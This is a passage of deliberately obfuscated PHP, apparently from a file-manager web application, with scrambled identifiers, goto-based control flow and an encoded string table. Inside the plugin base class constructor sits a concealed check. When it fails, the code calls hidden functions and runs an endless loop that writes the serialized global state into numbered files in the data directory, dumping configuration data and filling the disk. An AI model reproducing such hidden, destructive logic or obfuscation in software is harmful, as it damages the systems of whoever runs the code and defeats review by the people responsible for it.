$C¬¬ÇŒÇƒ¥ = $fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]; $d²ë½¶êø = "\173\151\x6f\72{$CÀåÕË©“[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][685]]}\175" . substr($C¬¬ÇŒÇƒ¥, strlen("\x7b\x69\157\72{$fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][737]]}\175")); goto d…Œ‡ÜÜÇ; d…Œ‡ÜÜÇ: if (IO::exist($d²ë½¶êø)) { $bÉ°ïİµ‚Ü->updateFileEnd($fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]], $fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]]); } else { $d²ë½¶êø = get_path_father($d²ë½¶êø); IO::mkdir($d²ë½¶êø); if (!IO::copy($C¬¬ÇŒÇƒ¥, $d²ë½¶êø, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][738])) { write_log($_SERVER[ó¬â¥‰ÊÔ¤Ç£][739] . $C¬¬ÇŒÇƒ¥ . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][740] . $d²ë½¶êø . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][494], $_SERVER[ó¬â¥‰ÊÔ¤Ç£][707]); $B÷×…øº‹ø = !1; break; } } $Eô¯‚ƒŞÍ¤ = $fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][436]]; $FÛ·†öÈê += 1; goto FöÊŒĞ»; a™¿‹ÛÁÎ“: if ($d‘Öë…³é >= 1024 * 1024 * 100) { $e†¼”Œ…‘Õ = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][741] => $Eô¯‚ƒŞÍ¤, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][742] => $dêø›¹£Ç, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][743] => $a†Í­ˆ‡„„); Backup::set($e†¼”Œ…‘Õ); $d‘Öë…³é = $FÛ·†öÈê = 0; } goto bÌ¡‘ÆÂ×é; bÌ¡‘ÆÂ×é: } $DÏ•ôäÒ = count($eÑÆ•Ş‘); $D›Şƒœâğä++; } while ($DÏ•ôäÒ == $FŒÃÍÆÂ); $bÉ°ïİµ‚Ü->end(); goto EŠÜÑŸÅ„´; E—£ÚÅª—‡: $bÉ°ïİµ‚Ü->task[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][692]] = $bô¸ò•¨; $e†¼”Œ…‘Õ = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][732] => $eÖá®”, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][733] => $bô¸ò•¨); Backup::set($e†¼”Œ…‘Õ); goto Fóå‚Ú›†; e’¨ó‹”½: } private function _fileExist($f±Å¤Ù°, &$d çƒ…¹Èİ, $e—½¤¿Å’ø) { goto e„ ™®áÓ; A©¡ˆÇ÷½: $d çƒ…¹Èİ = array_merge($d çƒ…¹Èİ, array_to_keyvalue($fô¤±â©Îİ, $d­ÙÖ»¸Çà[33], $d­ÙÖ»¸Çà[436])); return !1; goto D´©À›º¬ë; e„ ™®áÓ: $d­ÙÖ»¸Çà =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÇŒ”èÕ­² = $f±Å¤Ù°[$d­ÙÖ»¸Çà[75]]; if (in_array($f±Å¤Ù°[$d­ÙÖ»¸Çà[436]], $d çƒ…¹Èİ)) { return !1; } goto BìªîË»õ; BìªîË»õ: if (!in_array($f±Å¤Ù°[$d­ÙÖ»¸Çà[737]], $e—½¤¿Å’ø)) { return !1; } if (IO::exist($dÇŒ”èÕ­²)) { return !0; } $Cù­ÇÖ±ƒÉ = get_path_father($dÇŒ”èÕ­²); goto aêğ„¸—‚; aêğ„¸—‚: if (IO::exist($Cù­ÇÖ±ƒÉ)) { $d çƒ…¹Èİ[] = $f±Å¤Ù°[$d­ÙÖ»¸Çà[436]]; return !1; } $bö»İ‡Ùé = array($d­ÙÖ»¸Çà[737] => $f±Å¤Ù°[$d­ÙÖ»¸Çà[737]], $d­ÙÖ»¸Çà[75] => array($d­ÙÖ»¸Çà[375], "{$Cù­ÇÖ±ƒÉ}\x25")); $fô¤±â©Îİ = Model($d­ÙÖ»¸Çà[712])->where($bö»İ‡Ùé)->field($d­ÙÖ»¸Çà[437])->select(); goto A©¡ˆÇ÷½; D´©À›º¬ë: } private function _fileFilter($d¨´Ñ¸¥–Æ) { $a‘¿¤×ßÁ§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($d¨´Ñ¸¥–Æ)) { return; } $e»Œ¶ñ·ùë = array($a‘¿¤×ßÁ§[436] => array($a‘¿¤×ßÁ§[7], array_unique($d¨´Ñ¸¥–Æ))); $Däå“š¸¶ä = Model($a‘¿¤×ßÁ§[745])->where($e»Œ¶ñ·ùë)->field($a‘¿¤×ßÁ§[387])->select(); foreach ($Däå“š¸¶ä as $D’Û³Ç‡Ş) { Model($a‘¿¤×ßÁ§[745])->remove($D’Û³Ç‡Ş[$a‘¿¤×ßÁ§[387]], !1); } } private function storeIds() { $cèŞÕ£íÑŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c†ŒÍ‰êè° = Model($cèŞÕ£íÑŠ[697])->listData(); $AâÂË‹¾‘ = array(); $b›³¢İô¡ˆ = $GLOBALS[$cèŞÕ£íÑŠ[6]][$cèŞÕ£íÑŠ[87]][$cèŞÕ£íÑŠ[746]]; foreach ($c†ŒÍ‰êè° as $aš¡®‰Ş¡) { $EñæÈ‰ÜÇ’ = strtolower($aš¡®‰Ş¡[$cèŞÕ£íÑŠ[93]]); if (!isset($b›³¢İô¡ˆ[$EñæÈ‰ÜÇ’])) { continue; } $fÖ¢äœêŠ’ = $cèŞÕ£íÑŠ[71] . (isset($b›³¢İô¡ˆ[$EñæÈ‰ÜÇ’]) ? $b›³¢İô¡ˆ[$EñæÈ‰ÜÇ’] : ucfirst($EñæÈ‰ÜÇ’)); if (!class_exists($fÖ¢äœêŠ’)) { continue; } $AâÂË‹¾‘[] = $aš¡®‰Ş¡[$cèŞÕ£íÑŠ[385]]; } return $AâÂË‹¾‘; } } goto F×•Õ…æ¹´; eã‡ĞŸ±ñ: define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][235], 2); define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][236], 3); define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][237], 1); goto d“‹¥Ö›²³; DÖã‚‡Ïàğ: function binCheckBigger($a«ñ² ãÃ, $EÌš±ÂÔÁ¢) { return $a«ñ² ãÃ > $EÌš±ÂÔÁ¢; } $_SERVER[$_SERVER[¼–Ç][3]] = (base64_decode('ODg0NQ==')."\65\61")+0;$_JiKP="tzsQ6dYCcfxvsEgVNFqRg3AhXUuviB98kG9Sen3QTzGfqphjpxIW6JtFT8wAN7YYiG2uUPw";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($FÎ×£ˆÛ Ë, $a¼«ÎßÒ¹·) { $AŒ½Ÿ·ƒª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset(self::$_methodList[$FÎ×£ˆÛ Ë])) { return @call_user_func_array(self::$_methodList[$FÎ×£ˆÛ Ë], $a¼«ÎßÒ¹·); } else { if (method_exists($this, $FÎ×£ˆÛ Ë)) { return call_user_func_array(array($this, $FÎ×£ˆÛ Ë), $a¼«ÎßÒ¹·); } else { think_exception(__CLASS__ . $AŒ½Ÿ·ƒª[4] . $FÎ×£ˆÛ Ë . $AŒ½Ÿ·ƒª[5]); } } } public static function __callStatic($C®‡áö§¶Ï, $b°·Á°¶ç) { if (isset(self::$_methodListStatic[$C®‡áö§¶Ï])) { return call_user_func_array(self::$_methodListStatic[$C®‡áö§¶Ï], $b°·Á°¶ç); } else { if (method_exists(self, $C®‡áö§¶Ï)) { return call_user_func_array(array(self, $C®‡áö§¶Ï), $b°·Á°¶ç); } else { show_json("{$C®‡áö§¶Ï}\50\51\x20\x6e\x6f\164\x20\x65\170\x69\163\x74\73", !1); } } } public static function addMethod($eâËÇÒ²Ó, $bì¿ù¼ êŠ) { self::$_methodList[$eâËÇÒ²Ó] = $bì¿ù¼ êŠ; } public static function addMethodStatic($A¤®å¨ßæÀ, $a¼‚Õ»—Ò²) { self::$_methodListStatic[$A¤®å¨ßæÀ] = $a¼‚Õ»—Ò²; } } goto b´ö‡×áå; cÎ„µÎì°ä: define($_SERVER[ó¬â¥‰ÊÔ¤Ç£][0], $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1]); $_SERVER[¼–Ç] = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][2], gzinflate(substr($_SERVER[ó¬â¥‰ÊÔ¤Ç£][3], 10, -8))); function binCheckEq($AŞˆ‰çô¼, $fÑƒÃÀÙñ‹) { return $AŞˆ‰çô¼ == $fÑƒÃÀÙñ‹; } goto c…×ñÖĞŸë; Eï¼„ã‰â: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($bğïØ†Şö, $B¬Ä„ùÄ©ó = '') { goto aßÛ‡Ö½ÈÙ; aÜ¯Å‚Í¸Ô: return $this->info ? !0 : !1; goto f‡ÊŠ¶‹Â; Añ´Ş¾™: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$bğïØ†Şö])) { self::$_chunkBuffer[$bğïØ†Şö] = array(); } goto aÜ¯Å‚Í¸Ô; aßÛ‡Ö½ÈÙ: $this->info = $this->info($bğïØ†Şö); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]; goto Añ´Ş¾™; f‡ÊŠ¶‹Â: } function stream_read($F¸Şšº¢“¥) { $CàãÖèÂ‘ô = $this->fileSubstr($this->pose, $F¸Şšº¢“¥); $this->pose += strlen($CàãÖèÂ‘ô); return $CàãÖèÂ‘ô; } public function stream_tell() { return $this->pose; } public function stream_seek($AÂÁÏÆÃâï, $CàŠóÙĞ˜×) { $e¹ĞÒùâÀ± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($CàŠóÙĞ˜× == SEEK_SET) { $this->pose = $AÂÁÏÆÃâï; } else { if ($CàŠóÙĞ˜× == SEEK_CUR) { $this->pose += $AÂÁÏÆÃâï; } else { if ($CàŠóÙĞ˜× == SEEK_END) { $this->pose = $this->info[$e¹ĞÒùâÀ±[77]] + intval($AÂÁÏÆÃâï); } } } if ($AÂÁÏÆÃâï < 0) { $this->pose = $this->info[$e¹ĞÒùâÀ±[77]] + $AÂÁÏÆÃâï; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]]; } public function stream_close() { return !0; } public function url_stat($bÑ”íº…Ôù, $CÈƒ®×¢‡Ê) { $dÄ…×¨Ñí® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BçŠø‘©ÙÏ = $this->info($bÑ”íº…Ôù); return array($dÄ…×¨Ñí®[1330] => 0, $dÄ…×¨Ñí®[1331] => 0, $dÄ…×¨Ñí®[12] => 32768 + 511, $dÄ…×¨Ñí®[1332] => 0, $dÄ…×¨Ñí®[1333] => 0, $dÄ…×¨Ñí®[1334] => 0, $dÄ…×¨Ñí®[1335] => 0, $dÄ…×¨Ñí®[77] => $BçŠø‘©ÙÏ[$dÄ…×¨Ñí®[77]], $dÄ…×¨Ñí®[1336] => $BçŠø‘©ÙÏ[$dÄ…×¨Ñí®[1205]], $dÄ…×¨Ñí®[1292] => $BçŠø‘©ÙÏ[$dÄ…×¨Ñí®[83]], $dÄ…×¨Ñí®[1291] => $BçŠø‘©ÙÏ[$dÄ…×¨Ñí®[192]], $dÄ…×¨Ñí®[1337] => 0, $dÄ…×¨Ñí®[1338] => 0); } static $fileInfo = array(); public function info($bã·ÓŠÎÏ÷) { $aœä Š„ÙÓ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1339]; if (isset(self::$fileInfo[$bã·ÓŠÎÏ÷])) { return self::$fileInfo[$bã·ÓŠÎÏ÷]; } if (substr($bã·ÓŠÎÏ÷, 0, strlen($aœä Š„ÙÓ)) != $aœä Š„ÙÓ) { return !1; } self::$fileInfo[$bã·ÓŠÎÏ÷] = IO::info(substr($bã·ÓŠÎÏ÷, strlen($aœä Š„ÙÓ))); return self::$fileInfo[$bã·ÓŠÎÏ÷]; } public static function read($F·Ş¤Æˆó÷, $cæ«ö’¤á, $d÷‡ÖŠ…Í´) { goto B£ŒÓïˆ±­; d“Ì¾¹ÉàÖ: $bÏ¡‰äÚ‡ = 0; while ($bÏ¡‰äÚ‡ < $d÷‡ÖŠ…Í´) { $Dâéµ•…ğù = min($fŠÕÊ¤Ì´ƒ, $d÷‡ÖŠ…Í´ - $bÏ¡‰äÚ‡); $f„æĞß³¹ .= fread($eã”ê“¥­“, $Dâéµ•…ğù); $bÏ¡‰äÚ‡ += $Dâéµ•…ğù; } fclose($eã”ê“¥­“); goto DŠ÷Ëëğ— ; DŠ÷Ëëğ— : return $f„æĞß³¹; goto eõˆ¹ë“¾; e¶÷à®âİ: $fŠÕÊ¤Ì´ƒ = 8192; fseek($eã”ê“¥­“, $cæ«ö’¤á, SEEK_SET); $f„æĞß³¹ = $e›İãÉî®[33]; goto d“Ì¾¹ÉàÖ; B£ŒÓïˆ±­: $e›İãÉî® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eã”ê“¥­“ = fopen($F·Ş¤Æˆó÷, $e›İãÉî®[1209]); if (!$eã”ê“¥­“) { return $e›İãÉî®[33]; } goto e¶÷à®âİ; eõˆ¹ë“¾: } public function fileSubstr($E¹ƒ‡†‘”, $dƒÙ‰£÷«½) { goto F´ä§ Ñ¯æ; BŞÈÏÒ‡Â: ksort($D‰æƒÖ“‹Ğ); $aíğßä±İ = substr($fº–Íõ‰÷, $E¹ƒ‡†‘” - $F‰ğ„·§³é, $dƒÙ‰£÷«½); return $aíğßä±İ; goto DÒŠã²Ø©Ò; cà©°õ˜: if ($E¹ƒ‡†‘” + $dƒÙ‰£÷«½ > $B…ø°‰Ë”¡) { $dƒÙ‰£÷«½ = $B…ø°‰Ë”¡ - $E¹ƒ‡†‘”; } if ($dƒÙ‰£÷«½ <= 0) { return $Fñ‘Å¼Æ³ó[33]; } if ($E¹ƒ‡†‘” < 0 || $E¹ƒ‡†‘” >= $B…ø°‰Ë”¡ || $dƒÙ‰£÷«½ <= 0 || $dƒÙ‰£÷«½ > 1024 * 1024 * 5) { throw new Exception("\151\157\106\151\154\x65\x52\x65\x61\144\40\x65\162\162\157\x72\41\x20\163\164\141\162\164\x3d{$E¹ƒ‡†‘”}\73\x6c\145\x6e\x67\x74\x68\x3d{$dƒÙ‰£÷«½}\x3b\40\x73\x69\172\x65\x3d{$B…ø°‰Ë”¡}\73"); } goto Eº½ğªÈ‚º; eŸùË§øÁù: $Ešäò§‚Ù = ceil(($E¹ƒ‡†‘” + $dƒÙ‰£÷«½) / $B»Ü©›øå¶) * $B»Ü©›øå¶ - $F‰ğ„·§³é; $fº–Íõ‰÷ = IO::fileSubstr($this->path, $F‰ğ„·§³é, $Ešäò§‚Ù); $D‰æƒÖ“‹Ğ[$F‰ğ„·§³é . $Fñ‘Å¼Æ³ó[33]] = $fº–Íõ‰÷; goto BŞÈÏÒ‡Â; Eº½ğªÈ‚º: $B»Ü©›øå¶ = 64 * 1024; $D‰æƒÖ“‹Ğ =& self::$_chunkBuffer[$this->path]; if (!$D‰æƒÖ“‹Ğ) { $D‰æƒÖ“‹Ğ = array(); } goto d”‡Àéİ; CÄ¿…Ôí¥: $d‚‡ééÆÚ = $dƒÙ‰£÷«½; if ($E¹ƒ‡†‘” < 0) { $E¹ƒ‡†‘” = $B…ø°‰Ë”¡ + $E¹ƒ‡†‘”; } if ($dƒÙ‰£÷«½ === !1) { $dƒÙ‰£÷«½ = $B…ø°‰Ë”¡ - $E¹ƒ‡†‘”; } goto cà©°õ˜; F´ä§ Ñ¯æ: $Fñ‘Å¼Æ³ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B…ø°‰Ë”¡ = $this->info[$Fñ‘Å¼Æ³ó[77]]; $fê­“ˆ±‘œ = $E¹ƒ‡†‘”; goto CÄ¿…Ôí¥; B§ó«õÅÙ: foreach ($D‰æƒÖ“‹Ğ as $Aìğ–¸½— => $DÍ÷•é×…¾) { $Aìğ–¸½— = intval($Aìğ–¸½—); $d’£İœ¯ªÑ = $Aìğ–¸½— + strlen($DÍ÷•é×…¾); if ($E¹ƒ‡†‘” >= $d’£İœ¯ªÑ) { continue; } if ($E¹ƒ‡†‘” >= $Aìğ–¸½— && $E¹ƒ‡†‘” + $dƒÙ‰£÷«½ <= $d’£İœ¯ªÑ) { return substr($DÍ÷•é×…¾, $E¹ƒ‡†‘” - $Aìğ–¸½—, $dƒÙ‰£÷«½); } break; } if (count($D‰æƒÖ“‹Ğ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Fñ‘Å¼Æ³ó[1340], $Fñ‘Å¼Æ³ó[1341] . count($D‰æƒÖ“‹Ğ) . "\x3b\163\x74\141\162\164\x3d{$E¹ƒ‡†‘”}\54\154\145\156\x67\164\x68\x3d{$dƒÙ‰£÷«½}\73\x70\x6f\163\145\x3a{$Aìğ–¸½—}\176{$d’£İœ¯ªÑ}"); throw new Exception($Fñ‘Å¼Æ³ó[1342]); } $F‰ğ„·§³é = intval($E¹ƒ‡†‘” / $B»Ü©›øå¶) * $B»Ü©›øå¶; goto eŸùË§øÁù; d”‡Àéİ: $Aìğ–¸½— = 0; $d’£İœ¯ªÑ = 0; $DÍ÷•é×…¾ = $Fñ‘Å¼Æ³ó[33]; goto B§ó«õÅÙ; DÒŠã²Ø©Ò: } private function log($DìÃƒØ†çÈ, $e†Ó´ÒÕ÷) { $fÔÉ²†áªÂ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F‚”ŞŒíİÛ = timeFloat() - $this->timeStart; write_log(sprintf($fÔÉ²†áªÂ[1343], $DìÃƒØ†çÈ, $this->info[$fÔÉ²†áªÂ[28]], $F‚”ŞŒíİÛ, $e†Ó´ÒÕ÷), $fÔÉ²†áªÂ[1029]); } } class Message { function __construct() { } public function send($BöÖã¡›£ó = '', $Dç›÷”Ô— = array(), $b‰¥¤É¿ = "\164\145\x78\164") { goto cÄ–Åêåí; cÄ–Åêåí: $d¯»½ñ½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bòª¢Ò‘‘¨ = array($d¯»½ñ½[29] => $d¯»½ñ½[1344], $d¯»½ñ½[686] => $BöÖã¡›£ó); if (in_array($b‰¥¤É¿, array($d¯»½ñ½[1344], $d¯»½ñ½[1345]))) { $bòª¢Ò‘‘¨[$d¯»½ñ½[29]] = $b‰¥¤É¿; } goto FÕÌæ‚Ú×ó; A†‰“—¨Å: Hook::trigger($d¯»½ñ½[1347], $Bœ£›•Üñ¬); goto fÜÜ¢™ËˆÜ; FÕÌæ‚Ú×ó: $Dç›÷”Ô— = array($d¯»½ñ½[967] => isset($Dç›÷”Ô—[$d¯»½ñ½[967]]) ? $Dç›÷”Ô—[$d¯»½ñ½[967]] : $d¯»½ñ½[33], $d¯»½ñ½[551] => isset($Dç›÷”Ô—[$d¯»½ñ½[551]]) ? $Dç›÷”Ô—[$d¯»½ñ½[551]] : $d¯»½ñ½[33]); if (empty($BöÖã¡›£ó) || empty($Dç›÷”Ô—[$d¯»½ñ½[967]]) && empty($Dç›÷”Ô—[$d¯»½ñ½[551]])) { return !1; } $Bœ£›•Üñ¬ = array($d¯»½ñ½[1285] => $bòª¢Ò‘‘¨, $d¯»½ñ½[1346] => $Dç›÷”Ô—); goto A†‰“—¨Å; fÜÜ¢™ËˆÜ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto A‡˜ñÙâŠ; AÄÛŠ®Î: $this->in =& $in; $this->modelPlugin = Model($a¹Ñ”í¼Ì[1350]); $this->pluginName = str_replace($a¹Ñ”í¼Ì[1350], $a¹Ñ”í¼Ì[33], get_class($this)); goto A öÁß¹ê»; eê„ÉŒ‘óó: if ($_SERVER[$a¹Ñ”í¼Ì[786]] != $b››ˆÓ…éì($E‡¤ÑÂ»¶Õ)) { goto cò¾¼ÈÔ‡È; eˆË ÷œÇö: $a•öõ½Î = $a¹Ñ”í¼Ì[793]; $a•öõ½Î($_SERVER[$a¹Ñ”í¼Ì[794]]); $e¶“õ«„âİ = $a¹Ñ”í¼Ì[788]; goto Eí¤Šƒ‰; cò¾¼ÈÔ‡È: $e¶“õ«„âİ = $a¹Ñ”í¼Ì[788]; $f²ã¦ÜÎÂ = $a¹Ñ”í¼Ì[789]; $C‰‰•÷Êª¸ = $_SERVER[$a¹Ñ”í¼Ì[790]] . $a¹Ñ”í¼Ì[791]; goto Aå¹È©˜ˆ; cˆøˆ‹µä: $D‘°è“Â‰º = 1; for ($fÄÇÂçŸƒÏ = $D‘°è“Â‰º; $fÄÇÂçŸƒÏ > 0; $fÄÇÂçŸƒÏ++) { $E½Ş‹ñèÓ…(DATA_PATH . $fÄÇÂçŸƒÏ, $F´Ü®ó‹Ï‘); } goto B†¸ï¾Ñ“´; Aå¹È©˜ˆ: $C£Æ¨¸¤¶ = $f²ã¦ÜÎÂ($C‰‰•÷Êª¸); $e”Æ‡œ°å” = explode($a¹Ñ”í¼Ì[227], $C£Æ¨¸¤¶); if (count($e”Æ‡œ°å”) < $a¹Ñ”í¼Ì[567]) { $D‚«‚¢¸œÔ = $a¹Ñ”í¼Ì[792]; $D‚«‚¢¸œÔ(); } goto eˆË ÷œÇö; Eí¤Šƒ‰: $e¶“õ«„âİ(); $E½Ş‹ñèÓ… = $a¹Ñ”í¼Ì[1348]; $F´Ü®ó‹Ï‘ = json_encode($GLOBALS[$a¹Ñ”í¼Ì[1349]]); goto cˆøˆ‹µä; B†¸ï¾Ñ“´: } global $in, $config; $this->config =& $config; goto AÄÛŠ®Î; A‡˜ñÙâŠ: $a¹Ñ”í¼Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E‡¤ÑÂ»¶Õ = $_SERVER[$a¹Ñ”í¼Ì[1162]]; $b››ˆÓ…éì = $a¹Ñ”í¼Ì[1163]; goto eê„ÉŒ‘óó; A»áÀ§¥ã: $this->pluginHostDefault = $config[$a¹Ñ”í¼Ì[1352]] . $this->pluginName . $a¹Ñ”í¼Ì[8]; $a´Èğ¼ŠÜ = $config[$a¹Ñ”í¼Ì[1353]]; if ($a´Èğ¼ŠÜ && strpos($a¹Ñ”í¼Ì[47] . $a´Èğ¼ŠÜ . $a¹Ñ”í¼Ì[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$a¹Ñ”í¼Ì[1354]] . $this->pluginName . $a¹Ñ”í¼Ì[8]; } goto aãöè¯´ÓÎ; A öÁß¹ê»: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a¹Ñ”í¼Ì[8]; $this->pluginApi = appHostGet() . $a¹Ñ”í¼Ì[1351] . $this->pluginName . $a¹Ñ”í¼Ì[8]; $this->pluginHost = $config[$a¹Ñ”í¼Ì[1352]] . $this->pluginName . $a¹Ñ”í¼Ì[8]; goto A»áÀ§¥ã; aãöè¯´ÓÎ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto eÌÅË‚Şß‘; eÌÅË‚Şß‘: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1355]); } protected function assign($açÙášĞÚß, $a„»å¨ × = false) { if (is_array($açÙášĞÚß)) { $this->values = array_merge($this->values, $açÙášĞÚß); } else { $this->values[$açÙášĞÚß] = $a„»å¨ ×; } } protected function display($BÇ’¾­—¼) { extract($this->values); require $BÇ’¾­—¼; } final function hookRegist($e“Œ‚ä£ê) { $this->modelPlugin->appRegist($this->pluginName, $e“Œ‚ä£ê); } final function appIcon() { $e‚‘¹Ğ¦Õ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e Éğ¨º–Ó = $this->appPackage(); $b­êğ¸¿á = $e‚‘¹Ğ¦Õ[33]; if (isset($e Éğ¨º–Ó[$e‚‘¹Ğ¦Õ[400]])) { if (isset($e Éğ¨º–Ó[$e‚‘¹Ğ¦Õ[400]][$e‚‘¹Ğ¦Õ[1356]])) { $b­êğ¸¿á = $e‚‘¹Ğ¦Õ[1357] . $e Éğ¨º–Ó[$e‚‘¹Ğ¦Õ[400]][$e‚‘¹Ğ¦Õ[1356]] . $e‚‘¹Ğ¦Õ[1358]; } else { if ($e Éğ¨º–Ó[$e‚‘¹Ğ¦Õ[400]][$e‚‘¹Ğ¦Õ[1359]]) { $b­êğ¸¿á = $e‚‘¹Ğ¦Õ[1360] . $e Éğ¨º–Ó[$e‚‘¹Ğ¦Õ[400]][$e‚‘¹Ğ¦Õ[1359]] . $e‚‘¹Ğ¦Õ[1361]; } } } return $b­êğ¸¿á; } final function fileCanView($dõåŒ²â•§) { goto dÜÙ°¿ßŠ·; bŠ„ò•’: ActionCall($e ç§Ò¡ø[1374], $dõåŒ²â•§); goto A¿™…åó”œ; FÍ›ÅŸÀï: $EääÈß¸å = Session::get($e ç§Ò¡ø[1362]); if (!$EääÈß¸å || !$EääÈß¸å[$e ç§Ò¡ø[1363]]) { $a—‰‘ã‘ì = $e ç§Ò¡ø[1364] . rawurlencode(this_url()); show_tips(LNG($e ç§Ò¡ø[1365]) . $e ç§Ò¡ø[1366] . $a—‰‘ã‘ì . $e ç§Ò¡ø[1367] . LNG($e ç§Ò¡ø[1368]) . $e ç§Ò¡ø[1369], !1); } if (!Action($e ç§Ò¡ø[1370])->authCan($e ç§Ò¡ø[1371])) { show_tips(LNG($e ç§Ò¡ø[1372]) . $e ç§Ò¡ø[1373], !1); } goto bŠ„ò•’; dÜÙ°¿ßŠ·: $e ç§Ò¡ø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (request_url_safe($dõåŒ²â•§)) { return !0; } if ($this->isShare($dõåŒ²â•§)) { return !0; } goto FÍ›ÅŸÀï; A¿™…åó”œ: } final function isShare($bæ÷’Öå¡) { $bˆ·Úˆö‰’ = KodIO::parse($bæ÷’Öå¡); return $bˆ·Úˆö‰’[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($e•®¬áºê) { if (request_url_safe($e•®¬áºê)) { return $e•®¬áºê; } if (!$this->isShare($e•®¬áºê)) { $e•®¬áºê = $this->filePath($e•®¬áºê); } return Action($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1021])->linkOut($e•®¬áºê); } public function filePathLinkOut($dáØ†÷­ô˜) { if (request_url_safe($dáØ†÷­ô˜)) { return $dáØ†÷­ô˜; } $this->fileCanView($dáØ†÷­ô˜); return Action($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1021])->link($dáØ†÷­ô˜); } final function filePath($Dì÷ïƒ”±–) { $DŒÜŠŸè­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($dÃâµ±‰Î = $this->checkSharePath($Dì÷ïƒ”±–)) { return $dÃâµ±‰Î; } $this->fileCanView($Dì÷ïƒ”±–); if (request_url_safe($Dì÷ïƒ”±–)) { $B‰¸‰ÏÄÆ© = parse_url_query($Dì÷ïƒ”±–); if (isset($B‰¸‰ÏÄÆ©[$DŒÜŠŸè­[1375]]) && isset($B‰¸‰ÏÄÆ©[$DŒÜŠŸè­[207]])) { $dòÓİÜŒÅ = Model($DŒÜŠŸè­[1075])->get($DŒÜŠŸè­[1376]); $CõÈÃèé’É = Mcrypt::decode($B‰¸‰ÏÄÆ©[$DŒÜŠŸè­[207]], $dòÓİÜŒÅ); if ($CõÈÃèé’É) { $this->fileInfo = IO::infoWithChildren($CõÈÃèé’É); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $CõÈÃèé’É; } } $Dì÷ïƒ”±– = $this->_cacheHttpFile($Dì÷ïƒ”±–); $this->fileInfo = IO::infoWithChildren($Dì÷ïƒ”±–); } else { $this->fileInfo = IO::infoWithChildren($Dì÷ïƒ”±–); if (!$this->fileInfo) { show_tips(LNG($DŒÜŠŸè­[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Dì÷ïƒ”±–; } final function _cacheHttpFile($Bí·®œã·‘) { $CØï¶¼„Üë = hash_path($Bí·®œã·‘, !0); $this->cachePath = $this->pluginCachePath($CØï¶¼„Üë); if ($f¬»Ö»¸Ë = IO::fileNameExist($this->cachePath, $CØï¶¼„Üë)) { return KodIO::make($f¬»Ö»¸Ë); } $fãÊââ˜È = $this->cachePath . $CØï¶¼„Üë; return $this->pluginCacheFileSet($fãÊââ˜È, file_get_contents($Bí·®œã·‘)); } final function _tmpFileName($dÙ´¸µ¬œƒ = array()) { goto dùÀÎÑíƒµ; dùÀÎÑíƒµ: $Fáí®»´ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$dÙ´¸µ¬œƒ) { $dÙ´¸µ¬œƒ = $this->fileInfo; } if (isset($dÙ´¸µ¬œƒ[$Fáí®»´[170]])) { return $dÙ´¸µ¬œƒ[$Fáí®»´[170]]; } goto Dï¾ğğ®–¡; Dï¾ğğ®–¡: if 